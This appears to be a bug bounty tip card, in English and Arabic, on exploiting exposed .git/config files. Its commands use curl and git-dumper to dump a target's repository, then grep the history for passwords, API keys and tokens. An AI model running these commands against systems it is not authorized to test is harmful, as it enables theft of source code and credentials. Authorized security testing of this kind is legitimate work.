# .git/config exposed → full source dump with git-dumper ($500–$3500+ real cases)

**Rating:** ⭐ جيدة  
**Category:** Recon  
**Status:** Not started  

## How It Works

كشف .git/config قد يسمح باستنتاج إعدادات أو يؤكد أن مسارًا من مستودع Git مكشوف، لكنه لا يثبت تلقائيًا إمكانية سحب المستودع كاملًا أو وجود أسرار صالحة. ابدأ بطلب قراءة محدود وغير حساس، ثم وثّق الأثر دون استخراج تاريخ كامل أو استخدام أي credentials مكتشفة.

## Payload / Code

```
curl -I https://target.com/.git/config
git-dumper https://target.com/.git/ ./dump
cd dump && git log -p | grep -iE 'password|secret|api_key|token'
```

## Source

Multiple 2025 writeups: Ibtissam $3500, Syed €1000, Abhi Sharma $500, Sudarshana RCE chain

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
